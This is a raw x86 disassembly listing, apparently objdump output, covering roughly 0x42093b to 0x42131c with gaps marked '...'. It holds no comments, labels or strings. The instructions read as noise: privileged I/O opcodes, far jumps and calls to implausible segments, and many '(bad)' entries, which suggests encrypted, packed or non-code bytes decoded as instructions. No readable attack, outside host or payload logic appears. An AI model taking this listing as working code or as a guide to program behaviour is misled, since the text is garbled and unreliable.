  42093b:	jp     0x420955
  42093d:	push   edi
  42093e:	cmp    eax,0x4f14eb5
  420943:	shl    BYTE PTR [esp+edx*4+0x8efb9ef],1
  42094a:	sub    eax,0xbffedf07
  42094f:	iret   
  420950:	push   es
  420951:	mov    ds,ebx
  420953:	mov    esi,ebp
  420955:	pop    esp
  420956:	fimul  WORD PTR [ecx]
  420958:	pop    ebp
  420959:	or     eax,0x30939948
  42095e:	cld    
  42095f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420960:	es cdq 
  420962:	jno    0x420901
  420964:	inc    esi
  420965:	push   esp
  420966:	or     BYTE PTR ds:[ebp+edi*8+0x1e6386a5],ch
  42096e:	add    dh,BYTE PTR [eax]
  420970:	dec    sp
  420972:	scas   al,BYTE PTR es:[edi]
  420973:	sbb    dh,BYTE PTR [ebp*1-0x6ac8ee2c]
  42097a:	jp     0x4209f4
  42097c:	dec    edi
  42097d:	mov    esi,0xced775e0
  420982:	or     BYTE PTR [eax-0xd],bh
  420985:	in     al,dx
  420986:	cli    
  420987:	sub    al,0x5f
  420989:	fidiv  WORD PTR [esi]
  42098b:	adc    DWORD PTR [ebx-0x51e7415f],edi
  420991:	test   al,0x65
  420993:	jbe    0x42095f
  420995:	cdq    
  420996:	pop    es
  420997:	inc    ebp
  420998:	adc    BYTE PTR [ebp+0x25d96d8b],0x6d
  42099f:	enter  0x1066,0x1
  4209a3:	sar    BYTE PTR [ebx],1
  4209a5:	pop    ebp
  4209a6:	xchg   ebx,eax
  4209a7:	jbe    0x420a0e
  4209a9:	or     BYTE PTR [ebx],bl
  4209ab:	cmp    edi,DWORD PTR [ebp-0x61]
  4209ae:	add    al,0x7e
  4209b0:	xchg   esp,eax
  4209b1:	dec    esp
  4209b2:	xchg   esi,ecx
  4209b4:	adc    ebp,esp
  4209b6:	xlat   BYTE PTR ds:[ebx]
  4209b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209b8:	out    0xb,eax
  4209ba:	jne    0x420996
  4209bc:	rcr    DWORD PTR [edx],cl
  4209be:	fwait
  4209bf:	scas   eax,DWORD PTR es:[edi]
  4209c0:	cld    
  4209c1:	ins    BYTE PTR es:[edi],dx
  4209c2:	scas   eax,DWORD PTR es:[edi]
  4209c3:	call   0x27be:0xe5536e60
  4209ca:	xchg   edi,eax
  4209cb:	inc    esp
  4209cc:	cli    
  4209cd:	inc    esp
  4209ce:	lods   al,BYTE PTR ds:[esi]
  4209cf:	sbb    BYTE PTR [edi],ch
  4209d1:	pop    edi
  4209d2:	jecxz  0x4209a1
  4209d4:	or     DWORD PTR [eax],esi
  4209d6:	out    0xf6,al
  4209d8:	inc    ebp
  4209d9:	adc    edx,ecx
  4209db:	jecxz  0x420993
  4209dd:	jl     0x4209f4
  4209df:	jae    0x42098c
  4209e1:	jmp    0x772a:0xdb2ad842
  4209e8:	sub    BYTE PTR [ebx],0x10
  4209eb:	add    al,0xaa
  4209ed:	sub    DWORD PTR [esi-0x4c],eax
  4209f0:	mov    eax,0xce2eb720
  4209f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209f6:	jbe    0x4209a5
  4209f8:	xor    al,bl
  4209fa:	xchg   edx,eax
  4209fb:	or     esp,DWORD PTR [ecx-0x4a6120a0]
  420a01:	push   es
  420a02:	jbe    0x4209a0
  420a04:	dec    ebx
  420a05:	push   ebx
  420a06:	lock loope 0x4209e1
  420a09:	cmp    eax,0x6a65104e
  420a0e:	dec    ecx
  420a0f:	pop    eax
  420a10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a11:	mov    esp,DWORD PTR [edi+0x5fa55427]
  420a17:	inc    edx
  420a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a19:	pop    ds
  420a1a:	shr    DWORD PTR [ebp+0x4a],cl
  420a1d:	mov    cl,0x3f
  420a1f:	jle    0x420a89
  420a21:	push   es
  420a22:	xlat   BYTE PTR ds:[ebx]
  420a23:	std    
  420a24:	pop    eax
  420a25:	arpl   dx,di
  420a27:	loop   0x4209b5
  420a29:	test   al,0xb0
  420a2b:	nop
  420a2c:	inc    esi
  420a2d:	ds mov esi,0x41a607b
  420a33:	mov    al,ds:0xf2
	...
  420a94:	add    BYTE PTR [eax],al
  420a96:	fbstp  TBYTE PTR [edx]
  420a98:	scas   eax,DWORD PTR es:[edi]
  420a99:	adc    ebp,edi
  420a9b:	lahf   
  420a9c:	(bad)  
  420a9d:	(bad)  
  420a9e:	(bad)  
  420aa0:	std    
  420aa1:	test   al,ah
  420aa3:	xchg   ebx,eax
  420aa4:	inc    esi
  420aa5:	(bad)  
  420aa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420aa7:	pop    edx
  420aa8:	add    DWORD PTR [eax],eax
  420aaa:	pop    es
  420aab:	add    DWORD PTR [eax],eax
  420aad:	add    BYTE PTR [edi+0x59ce7a4c],ah
  420ab3:	into   
  420ab4:	(bad)  
  420ab5:	jge    0x420b01
  420ab7:	cwde   
  420ab8:	loop   0x420a74
  420aba:	adc    BYTE PTR [ecx],bl
  420abc:	xor    al,0x97
  420abe:	jge    0x420b27
  420ac0:	push   edi
  420ac1:	ds inc edi
  420ac3:	mov    esi,0xd6e395ee
  420ac8:	stos   DWORD PTR es:[edi],eax
  420ac9:	sbb    BYTE PTR [eax-0x1539e697],bl
  420acf:	or     eax,0x99e063ea
  420ad4:	inc    ebp
  420ad5:	mov    cl,0x59
  420ad7:	adc    DWORD PTR cs:[ecx],esi
  420ada:	xchg   BYTE PTR [ecx],dh
  420adc:	xor    DWORD PTR [eax-0xc],esp
  420adf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ae0:	adc    eax,0xd04ea861
  420ae5:	dec    edi
  420ae6:	repnz add ah,al
  420ae9:	pop    ds
  420aea:	sar    edx,0x13
  420aed:	cwde   
  420aee:	fs addr16 ret 0x613d
  420af3:	cmp    eax,0x91110f31
  420af8:	cmp    al,0x6f
  420afa:	or     BYTE PTR [ebx+0x28d0e2c4],0xb9
  420b01:	add    bh,dl
  420b03:	ret    0x896f
  420b06:	inc    ebx
  420b07:	shl    DWORD PTR [edx-0x2d5b6e74],0x92
  420b0e:	cmp    BYTE PTR [eax-0x2c],cl
  420b11:	div    BYTE PTR gs:[esi+edi*4-0x4ff89ebf]
  420b19:	pushf  
  420b1a:	cmp    ah,BYTE PTR [ebx]
  420b1c:	push   0x60101ca2
  420b21:	push   0x62
  420b23:	sbb    al,0xb8
  420b25:	call   0x12a4:0x6ce4f928
  420b2c:	xchg   edx,eax
  420b2d:	dec    edi
  420b2e:	out    0x47,al
  420b30:	inc    esi
  420b31:	push   esi
  420b32:	test   al,0x8e
  420b34:	add    bl,BYTE PTR [eax]
  420b36:	int3   
  420b37:	cmp    ah,al
  420b39:	and    al,0x5
  420b3b:	ret    0xbfdb
  420b3e:	jmp    0xdee:0x9b79ae9f
  420b45:	inc    eax
  420b46:	or     eax,0x5e271ce5
  420b4b:	loope  0x420b41
  420b4d:	dec    esp
  420b4e:	jnp    0x420adb
  420b50:	ret    
  420b51:	popa   
  420b52:	push   esi
  420b53:	dec    eax
  420b54:	nop
  420b55:	xor    DWORD PTR [edi],0x14
  420b58:	into   
  420b59:	arpl   WORD PTR [edx],bx
  420b5b:	das    
  420b5c:	cmc    
  420b5d:	jecxz  0x420bc1
  420b5f:	imul   eax,DWORD PTR [ebx],0xd47995c6
  420b65:	aam    0x7c
  420b67:	cmp    eax,0x8b492021
  420b6c:	mov    ah,0xc3
  420b6e:	aam    0xd2
  420b70:	mov    dl,0xef
  420b72:	std    
  420b73:	adc    DWORD PTR [ebp+0x5a],ebp
  420b76:	or     DWORD PTR [edi],ebp
  420b78:	push   ss
  420b79:	lods   al,BYTE PTR ds:[esi]
  420b7a:	cld    
  420b7b:	jno    0x420b80
  420b7d:	dec    ecx
  420b7e:	ret    0xc0e5
  420b81:	out    0xd3,al
  420b83:	ret    0xddef
  420b86:	xchg   al,bl
  420b88:	sub    dh,BYTE PTR [esi+0x4c124851]
  420b8e:	mov    BYTE PTR [ebp-0x6b58751a],ch
  420b94:	cmc    
  420b95:	jecxz  0x420b42
  420b97:	sbb    esi,edi
  420b99:	inc    esi
  420b9a:	xchg   ebp,eax
  420b9b:	jg     0x420b9c
  420b9d:	ret    0x8752
  420ba0:	ins    BYTE PTR es:[edi],dx
  420ba1:	(bad)  
  420ba2:	sti    
  420ba3:	ret    0x92b9
  420ba6:	rcl    DWORD PTR [eax],1
  420ba8:	lds    esp,FWORD PTR [edx+0x22c8378c]
  420bae:	movntq QWORD PTR [ebp+0x23734449],mm1
	...
  420c15:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c1b:	mov    edi,0x65553fba
  420c20:	pop    edx
  420c21:	stc    
  420c22:	mov    al,bl
  420c24:	hlt    
  420c25:	sub    ebp,DWORD PTR [ebx+ebx*2+0x1070001]
  420c2c:	add    BYTE PTR [eax],al
  420c2e:	mov    bl,0xe1
  420c30:	adc    bh,BYTE PTR [edx]
  420c32:	ss dec ebp
  420c34:	or     bl,cl
  420c36:	stos   DWORD PTR es:[edi],eax
  420c37:	pop    edx
  420c38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c39:	mov    bl,dh
  420c3b:	or     DWORD PTR [esi+0x29],edi
  420c3e:	or     eax,0xc3f95955
  420c43:	cmp    ecx,edi
  420c45:	dec    edx
  420c46:	ficom  WORD PTR [eax-0x7f]
  420c49:	sbb    esi,DWORD PTR [ecx-0x44cd30da]
  420c4f:	xor    BYTE PTR [ecx+0x6f],0xa2
  420c53:	cmp    edi,DWORD PTR [ebx+esi*1+0x24]
  420c57:	mov    esi,0xf2244e32
  420c5c:	mov    edi,0x638613e0
  420c61:	fwait
  420c62:	shl    edx,1
  420c64:	pop    ss
  420c65:	mov    edx,0x5cb66d80
  420c6a:	jp     0x420bf8
  420c6c:	sbb    al,0x49
  420c6e:	in     eax,0x97
  420c70:	sub    al,0x89
  420c72:	enter  0x98b1,0x49
  420c76:	pop    edi
  420c77:	aas    
  420c78:	pop    ds
  420c79:	sbb    al,0x2a
  420c7b:	ss hlt 
  420c7d:	jecxz  0x420c54
  420c7f:	outs   dx,DWORD PTR ds:[esi]
  420c80:	adc    ebx,DWORD PTR [edi+esi*2-0x4e]
  420c84:	shl    BYTE PTR [ecx-0x49],0x3
  420c88:	out    dx,eax
  420c89:	sub    BYTE PTR [edx-0x80],al
  420c8c:	data16 cs sub al,0xa2
  420c90:	xchg   ebx,eax
  420c91:	fild   WORD PTR [esi+0x48]
  420c94:	daa    
  420c95:	shl    BYTE PTR [edx+0x5d8ec393],1
  420c9b:	cdq    
  420c9c:	jmp    0x900005ec
  420ca1:	rol    DWORD PTR [esi],1
  420ca3:	dec    ebx
  420ca4:	leave  
  420ca5:	adc    BYTE PTR [esi-0x4e82b4dd],bh
  420cab:	mov    ch,0x50
  420cad:	pop    esp
  420cae:	(bad)  [ebx]
  420cb0:	jno    0x420cfd
  420cb2:	cmc    
  420cb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cb4:	mov    dl,0x7e
  420cb6:	lahf   
  420cb7:	out    dx,al
  420cb8:	sub    ebp,DWORD PTR [edx+edi*2-0x76]
  420cbc:	xchg   BYTE PTR [ebp-0x17],dl
  420cbf:	mov    esp,0x70618b60
  420cc4:	adc    ah,cl
  420cc6:	adc    DWORD PTR [ebx-0x5a],edi
  420cc9:	jns    0x420c82
  420ccb:	nop
  420ccc:	adc    BYTE PTR [ebx-0x1],dl
  420ccf:	shl    DWORD PTR ds:0x9d279f1e,1
  420cd5:	push   eax
  420cd6:	(bad)  
  420cd7:	cli    
  420cd8:	xchg   ebp,eax
  420cd9:	adc    BYTE PTR [edx+0x733d475f],ah
  420cdf:	adc    eax,0xa6c75d01
  420ce4:	shr    BYTE PTR [ecx-0x24],0x87
  420ce8:	jmp    0x6c5d:0x3605bad3
  420cef:	or     bl,0x60
  420cf2:	push   ds
  420cf3:	mov    ah,0x96
  420cf5:	pop    eax
  420cf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cf7:	mov    edi,0x3a993e3f
  420cfc:	adc    eax,DWORD PTR [esi-0x73b320ed]
  420d02:	lock lahf 
  420d04:	sahf   
  420d05:	jb     0x420d86
  420d07:	add    eax,0x8e4f496
  420d0c:	mov    cl,0x8b
  420d0e:	xor    ah,cl
  420d10:	daa    
  420d11:	nop
  420d12:	sti    
  420d13:	(bad)  
  420d14:	in     al,dx
  420d15:	retf   0xafc4
  420d18:	and    ecx,DWORD PTR [edx]
  420d1a:	pop    ebx
  420d1b:	and    cl,BYTE PTR [edx-0x4c3703b4]
  420d21:	and    ebx,DWORD PTR [edx+ebp*8]
  420d24:	jg     0x420d3d
  420d26:	inc    edi
  420d27:	mov    dl,0x4e
  420d29:	aam    0xf8
  420d2b:	stos   DWORD PTR es:[edi],eax
  420d2c:	(bad)
  420d30:	mov    dl,0xd0
  420d32:	dec    ebp
  420d33:	inc    ecx
  420d34:	(bad)  
	...
  420d95:	add    bh,ah
  420d97:	push   ds
  420d98:	into   
  420d99:	push   0x9fe7f8ff
  420d9e:	mov    edi,0x8f0c1cea
  420da3:	pop    ebx
  420da4:	pop    esi
  420da5:	adc    al,0xb3
  420da7:	pop    esp
  420da8:	add    DWORD PTR [eax],eax
  420daa:	pop    es
  420dab:	add    DWORD PTR [eax],eax
  420dad:	add    BYTE PTR [esi-0x37d659e1],al
  420db3:	cmc    
  420db4:	jl     0x420d7a
  420db6:	sti    
  420db7:	fiadd  DWORD PTR [esi+esi*1]
  420dba:	dec    esp
  420dbb:	push   cs
  420dbc:	sub    al,dl
  420dbe:	jmp    0x1a2681e1
  420dc3:	sbb    al,0x32
  420dc5:	dec    ebp
  420dc6:	popf   
  420dc7:	hlt    
  420dc8:	in     eax,0xd6
  420dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420dcb:	inc    esp
  420dcc:	add    al,0x3a
  420dce:	(bad)  
  420dd1:	sub    al,0xd6
  420dd3:	mov    ebp,DWORD PTR [di-0x2ec8]
  420dd8:	popf   
  420dd9:	dec    DWORD PTR [edi-0x7b]
  420ddc:	xor    al,0xe0
  420dde:	fcmovnu st,st(2)
  420de0:	jl     0x420e2c
  420de2:	pop    esi
  420de3:	jle    0x420e55
  420de5:	add    al,0xfe
  420de7:	push   ebx
  420de8:	fsubp  st(4),st
  420dea:	scas   al,BYTE PTR es:[edi]
  420deb:	mov    cl,0x43
  420ded:	lock call 0x6e7d:0x8a12bf95
  420df5:	sbb    BYTE PTR gs:[ecx+0x16],cl
  420df9:	fcomp  DWORD PTR [edi+0x7c]
  420dfc:	js     0x420e01
  420dfe:	imul   ebp,DWORD PTR [ecx*8+0x1d0d7747],0x9987c026
  420e09:	test   al,0xfa
  420e0b:	jo     0x420ddd
  420e0d:	ds push cs
  420e0f:	jmp    0x91fa:0x22767e84
  420e16:	or     al,0xc6
  420e18:	mov    ebp,0x30d1f7e3
  420e1d:	retf   0x5071
  420e20:	dec    esp
  420e21:	cdq    
  420e22:	test   DWORD PTR ds:0x8a1909e1,ebx
  420e28:	and    ch,bh
  420e2a:	std    
  420e2b:	pop    es
  420e2c:	test   DWORD PTR [ebx],esp
  420e2e:	mov    dl,BYTE PTR [eax+0x1b]
  420e31:	in     eax,0x4d
  420e33:	jno    0x420e41
  420e35:	std    
  420e36:	xchg   esi,eax
  420e37:	cdq    
  420e38:	jbe    0x420df6
  420e3a:	jb     0x420e5a
  420e3c:	mov    esp,0xdadd4009
  420e41:	mov    esi,0x2298e622
  420e46:	int3   
  420e47:	mov    ah,0xa2
  420e49:	pop    eax
  420e4a:	jle    0x420e05
  420e4c:	fdivr  st,st(6)
  420e4e:	in     al,0x5
  420e50:	adc    DWORD PTR [ecx-0x5d9fa200],edx
  420e56:	aad    0x6f
  420e58:	pop    edx
  420e59:	(bad)  
  420e5a:	aam    0x38
  420e5c:	inc    edx
  420e5d:	scas   al,BYTE PTR es:[edi]
  420e5e:	les    edx,FWORD PTR [edi-0x36]
  420e61:	test   BYTE PTR [ebp+0x72],cl
  420e64:	mov    al,0x1b
  420e66:	sub    al,BYTE PTR [ecx]
  420e68:	in     al,dx
  420e69:	outs   dx,BYTE PTR ds:[esi]
  420e6a:	xchg   ebx,eax
  420e6b:	sub    DWORD PTR [ecx],edi
  420e6d:	mov    esi,0x657632b5
  420e72:	jns    0x420e95
  420e74:	ret    0xb0ce
  420e77:	lods   al,BYTE PTR ds:[esi]
  420e78:	call   0x2097:0x6057bd27
  420e7f:	lods   al,BYTE PTR ds:[esi]
  420e80:	dec    ecx
  420e81:	xchg   DWORD PTR [eax+esi*8],esp
  420e84:	iret   
  420e85:	test   BYTE PTR [edx+0x5050cfcd],ah
  420e8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e8c:	mov    al,ds:0x3d738788
  420e91:	push   ebx
  420e92:	aaa    
  420e93:	dec    esi
  420e94:	and    cl,BYTE PTR [edi]
  420e96:	es scas eax,DWORD PTR es:[edi]
  420e98:	mov    ds:0xd3dd39e8,al
  420e9d:	and    eax,0xd771108f
  420ea2:	or     edi,edx
  420ea4:	repz mov eax,ds:0x361e21f6
  420eaa:	lods   eax,DWORD PTR ds:[esi]
  420eab:	push   eax
  420eac:	jl     0x420ee2
  420eae:	loopne 0x420eb2
  420eb0:	cmp    esi,ebp
  420eb2:	cdq    
  420eb3:	cmp    ecx,DWORD PTR [eax+eax*1]
	...
  420f16:	and    BYTE PTR [edi-0x28082cbe],dl
  420f1c:	mov    cl,0xf7
  420f1e:	sub    ch,0x3e
  420f21:	ds out dx,al
  420f23:	dec    edx
  420f24:	scas   eax,DWORD PTR es:[edi]
  420f25:	stc    
  420f26:	mov    edx,0x700015d
  420f2b:	add    DWORD PTR [eax],eax
  420f2d:	add    BYTE PTR [eax+0x43],cl
  420f30:	push   ebp
  420f31:	std    
  420f32:	call   0x3781e02b
  420f37:	adc    eax,0x3e6fc1d6
  420f3c:	add    ecx,DWORD PTR [eax+0x5952015e]
  420f42:	jo     0x420fab
  420f44:	xchg   edx,eax
  420f45:	sub    dh,BYTE PTR [ebx+0x7a3125a9]
  420f4b:	add    BYTE PTR [edx],ah
  420f4d:	pop    es
  420f4e:	mov    eax,0xd374f6bb
  420f53:	adc    eax,0x4183d43f
  420f58:	lods   al,BYTE PTR ds:[esi]
  420f59:	daa    
  420f5a:	outs   dx,DWORD PTR ds:[esi]
  420f5b:	aam    0x37
  420f5d:	ficom  WORD PTR [eax-0x403be1e2]
  420f63:	sbb    al,0xb9
  420f65:	shl    DWORD PTR [esi],1
  420f67:	cmp    DWORD PTR [ebx],edx
  420f69:	and    ch,BYTE PTR [edi+0x62cc17d4]
  420f6f:	das    
  420f70:	and    edi,esi
  420f72:	stc    
  420f73:	(bad)  
  420f74:	out    dx,al
  420f75:	das    
  420f76:	sub    bl,bl
  420f78:	sub    dl,BYTE PTR [eax-0x41]
  420f7b:	es mov bh,0x7
  420f7e:	out    dx,al
  420f7f:	xchg   edi,eax
  420f80:	sub    bl,BYTE PTR [esi-0x1403ebd3]
  420f86:	push   ebp
  420f87:	lea    edx,[ebp-0x61ceeaa3]
  420f8d:	xchg   edi,eax
  420f8e:	mov    esp,0xfbc3b2de
  420f93:	mov    ebx,0xf16b7e43
  420f98:	mov    edi,0x4bb4501
  420f9d:	js     0x420fe9
  420f9f:	dec    esi
  420fa0:	jl     0x420fe7
  420fa2:	mov    al,ds:0x4068689c
  420fa7:	icebp  
  420fa8:	loope  0x420f30
  420faa:	jecxz  0x420f5d
  420fac:	(bad)  
  420fad:	stos   BYTE PTR es:[edi],al
  420fae:	jns    0x420fd7
  420fb0:	jb     0x420fbd
  420fb2:	fs push ebp
  420fb4:	mov    ecx,0xc8869aa9
  420fb9:	sub    BYTE PTR [ebp+0x7d49b950],ch
  420fbf:	inc    BYTE PTR [esi+0x4a]
  420fc2:	jmp    0x42101b
  420fc4:	mov    eax,0x31d4e855
  420fc9:	mov    ah,BYTE PTR [esi+edx*8-0x76]
  420fcd:	mov    edx,0x63a28e4c
  420fd2:	retf   
  420fd3:	and    eax,DWORD PTR [eax]
  420fd5:	mov    ds:0xefbb9281,al
  420fda:	fisttp DWORD PTR [ebp+edi*1+0x4d]
  420fde:	lea    edi,[eax]
  420fe0:	je     0x420f7c
  420fe2:	cmp    BYTE PTR [esi-0x64fddb33],0x49
  420fe9:	and    al,0x53
  420feb:	scas   eax,DWORD PTR es:[edi]
  420fec:	cmp    dh,BYTE PTR ds:0xb80e2d9e
  420ff2:	rcl    DWORD PTR [esi-0x9],cl
  420ff5:	(bad)  
  420ff6:	dec    ebx
  420ff7:	sub    BYTE PTR [esi+0x33],bl
  420ffa:	mov    ecx,0x9e508437
  420fff:	mov    ecx,0xf8400878
  421004:	cmp    eax,0xa0ff0f2b
  421009:	ja     0x420fbf
  42100b:	(bad)  
  42100c:	jo     0x42104a
  42100e:	mov    BYTE PTR [edx],bl
  421010:	adc    al,0xca
  421012:	push   ebp
  421013:	ror    BYTE PTR [ebx-0xe],0x69
  421017:	jg     0x420fb2
  421019:	pop    eax
  42101a:	fs xchg esp,eax
  42101c:	sbb    al,0x15
  42101e:	rcr    DWORD PTR [eax-0x55daf3da],1
  421024:	stos   DWORD PTR es:[edi],eax
  421025:	sbb    dh,BYTE PTR [edx-0x65b7b2e8]
  42102b:	das    
  42102c:	adc    BYTE PTR [eax+esi*8],bh
  42102f:	jns    0x420fb9
  421031:	fild   WORD PTR [edi+eiz*4+0x7e]
	...
  421094:	add    BYTE PTR [eax],al
  421096:	lahf   
  421097:	pop    esi
  421098:	fcmovb st,st(6)
  42109a:	fcmovnb st,st(6)
  42109c:	lahf   
  42109d:	pop    edi
  42109e:	retf   
  42109f:	inc    esi
  4210a0:	and    eax,0xebf2a3fe
  4210a5:	dec    ebp
  4210a6:	rcr    DWORD PTR [esi+0x1],0x0
  4210aa:	pop    es
  4210ab:	add    DWORD PTR [eax],eax
  4210ad:	add    BYTE PTR [ecx],al
  4210af:	add    BYTE PTR [ebx-0x74e505a],0xf9
  4210b6:	in     al,0xde
  4210b8:	sti    
  4210b9:	pop    esp
  4210ba:	jo     0x42108a
  4210bc:	retf   
  4210bd:	or     eax,0x239f7bfa
  4210c2:	or     dh,dh
  4210c4:	int    0xea
  4210c6:	sub    bh,al
  4210c8:	pop    es
  4210c9:	push   edx
  4210ca:	and    esi,DWORD PTR [edx-0x39]
  4210cd:	inc    ebp
  4210ce:	popa   
  4210cf:	push   ds
  4210d0:	lock add al,0xb7
  4210d3:	ss stos BYTE PTR es:[edi],al
  4210d5:	js     0x4210cd
  4210d7:	lods   al,BYTE PTR ds:[esi]
  4210d8:	add    eax,0x3bdc6323
  4210dd:	mov    esi,0xfc5a2ab6
  4210e2:	mov    ebp,0x497e2731
  4210e7:	aaa    
  4210e8:	(bad)  
  4210e9:	cmp    al,0x6d
  4210eb:	dec    edi
  4210ec:	jns    0x4210d5
  4210ee:	pop    eax
  4210ef:	push   ss
  4210f0:	retf   
  4210f1:	cs dec eax
  4210f3:	test   DWORD PTR [ecx+0xc4bbe4b],0xbb1bc3a7
  4210fd:	jbe    0x42113d
  4210ff:	je     0x421145
  421101:	inc    esp
  421102:	or     BYTE PTR [esp+edx*2],al
  421105:	sub    dl,BYTE PTR [esi*2+0x32f662fc]
  42110c:	xor    edi,DWORD PTR [ebx+eiz*8]
  42110f:	jne    0x421107
  421111:	mov    ebx,0x715d1682
  421116:	aam    0xee
  421118:	push   ebx
  421119:	lock ret 
  42111b:	icebp  
  42111c:	ror    DWORD PTR [esi+ebp*8],1
  42111f:	out    0x5d,al
  421121:	and    edx,DWORD PTR [edi+0x3452d26a]
  421127:	int3   
  421128:	(bad)  
  421129:	cwde   
  42112a:	lea    ecx,[ecx]
  42112c:	sub    BYTE PTR [ebp+0x1cd41d7d],al
  421132:	cmp    al,0xa5
  421134:	cdq    
  421135:	push   ds
  421136:	xor    DWORD PTR [esi],ebp
  421138:	add    DWORD PTR [esi+esi*1-0x71e325d5],0xfffffff0
  421140:	or     al,0x5e
  421142:	shl    esi,0x1c
  421145:	call   0xc8a6:0x33a6bceb
  42114c:	mov    ds:0x452585ab,al
  421151:	dec    ebp
  421152:	jo     0x4211a2
  421154:	fwait
  421155:	jnp    0x4211aa
  421157:	outs   dx,DWORD PTR ds:[esi]
  421158:	xor    dl,BYTE PTR [ecx+0x3a]
  42115b:	test   bl,cl
  42115d:	sbb    DWORD PTR [ebx],0x2
  421160:	pop    edx
  421161:	push   ebx
  421162:	jo     0x4211bb
  421164:	sti    
  421165:	gs jmp 0x2e15e3a4
  42116b:	jo     0x4211e8
  42116d:	inc    ebx
  42116e:	push   0xffffff94
  421170:	call   0xbe7c:0xfa423f30
  421177:	fld    DWORD PTR ds:0xa6a62a03
  42117d:	xchg   ebp,eax
  42117e:	int3   
  42117f:	jp     0x4211f4
  421181:	push   0xe0e29181
  421186:	mov    es,WORD PTR [eax+0x34]
  421189:	adc    ebx,DWORD PTR [eax+edi*2-0x276c80b5]
  421190:	mov    ch,0xeb
  421192:	add    DWORD PTR [esi+edx*8+0x7],eax
  421196:	mov    bl,0x65
  421198:	pop    edx
  421199:	in     eax,0x4d
  42119b:	dec    edi
  42119c:	sub    DWORD PTR [esi-0x46],edi
  42119f:	pop    ss
  4211a0:	pusha  
  4211a1:	jno    0x421184
  4211a3:	push   ebp
  4211a4:	(bad)  [edx-0x62]
  4211a7:	jge    0x421156
  4211a9:	lods   al,BYTE PTR ds:[esi]
  4211aa:	pop    eax
  4211ab:	pop    eax
  4211ac:	leave  
  4211ad:	dec    esi
  4211ae:	cmp    cl,BYTE PTR [ebx+0x3fe52b0a]
  4211b4:	jb     0x4211b6
	...
  421216:	sahf   
  421217:	pop    ds
  421218:	(bad)  
  421219:	test   DWORD PTR [edi+0x617ffef7],0x2c492007
  421223:	fucomi st,st(5)
  421225:	adc    ecx,eax
  421227:	pop    edi
  421228:	add    DWORD PTR [eax],eax
  42122a:	pop    es
  42122b:	add    DWORD PTR [eax],eax
  42122d:	add    BYTE PTR [ecx],dl
  42122f:	call   0xc4cf7232
  421234:	sub    esp,0x1c
  421237:	add    dl,dl
  421239:	or     DWORD PTR [eax*1+0x12b214e7],ecx
  421240:	inc    esp
  421241:	add    bl,BYTE PTR cs:[eax]
  421244:	adc    al,0x91
  421246:	ss jle 0x421269
  421249:	cwde   
  42124a:	gs (bad) 
  42124d:	push   ebp
  42124e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42124f:	xchg   ecx,eax
  421250:	scas   al,BYTE PTR es:[edi]
  421251:	call   0xbeff:0x1b7c8d70
  421258:	shr    ch,0xbd
  42125b:	cmp    DWORD PTR [esp+esi*2],ecx
  42125e:	add    DWORD PTR [eax],ecx
  421260:	adc    dh,al
  421262:	cli    
  421263:	adc    bl,BYTE PTR [eax+0x27]
  421266:	out    0x73,eax
  421268:	xchg   edi,eax
  421269:	test   dl,bh
  42126b:	or     DWORD PTR [edx-0x782861b9],ebx
  421271:	jg     0x4212c3
  421273:	push   esi
  421274:	into   
  421275:	or     bl,dh
  421277:	mov    esp,0xeb7e0c59
  42127c:	fild   DWORD PTR [ebp+0x4b87011b]
  421282:	pop    eax
  421283:	or     bl,dl
  421285:	test   DWORD PTR [esi],esp
  421287:	and    al,BYTE PTR [ebp+0x79]
  42128a:	mul    bl
  42128c:	mov    al,ss:0xe37f21ac
  421292:	mov    dh,0x9e
  421294:	loopne 0x42121d
  421296:	sub    BYTE PTR [ecx],bh
  421298:	mov    ecx,0xb7a8d31e
  42129d:	addr16 inc ebx
  42129f:	and    ch,BYTE PTR [eax]
  4212a1:	in     eax,0xfc
  4212a3:	int3   
  4212a4:	mov    cl,0x65
  4212a6:	ret    
  4212a7:	push   ds
  4212a8:	pusha  
  4212a9:	arpl   WORD PTR [edx],si
  4212ab:	test   BYTE PTR [edi],dh
  4212ad:	loope  0x421252
  4212af:	xchg   DWORD PTR [ebx+0x1de6f6b5],edi
  4212b5:	js     0x4212c5
  4212b7:	sub    ch,BYTE PTR [eax+0xedf9785]
  4212bd:	leave  
  4212be:	bound  ecx,QWORD PTR [ecx+0x54]
  4212c1:	push   esi
  4212c2:	adc    eax,0xb44017d9
  4212c7:	call   0x30a0:0x683c81d0
  4212ce:	test   BYTE PTR [ebx],0x57
  4212d1:	adc    eax,0x5d0880e1
  4212d6:	inc    ecx
  4212d7:	jno    0x421268
  4212d9:	iret   
  4212da:	jnp    0x42130d
  4212dc:	and    esi,eax
  4212de:	inc    edx
  4212df:	enter  0x6cfb,0x72
  4212e3:	(bad)  
  4212e4:	add    DWORD PTR [ebp+0x47],edx
  4212e7:	not    ecx
  4212e9:	inc    edi
  4212ea:	fsubr  DWORD PTR [edi+0x65]
  4212ed:	in     eax,dx
  4212ee:	sbb    al,BYTE PTR [ebx]
  4212f0:	popf   
  4212f1:	cmp    BYTE PTR [ebx],0x4
  4212f4:	mov    ebp,0xb22aab66
  4212f9:	out    dx,eax
  4212fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212fb:	xchg   dh,dl
  4212fd:	call   0xa98bbc97
  421302:	and    DWORD PTR [eax],esp
  421304:	and    al,0xef
  421306:	pop    esp
  421307:	pop    ds
  421308:	xor    ebx,DWORD PTR [ebx]
  42130a:	cmp    eax,0xed59fc27
  42130f:	push   eax
  421310:	fadd   QWORD PTR [ebp+ebx*1+0x7e]
  421314:	sti    
  421315:	nop
  421316:	inc    esi
  421317:	in     eax,0x86
  421319:	shl    BYTE PTR [ebx],0x9a
  42131c:	iret   
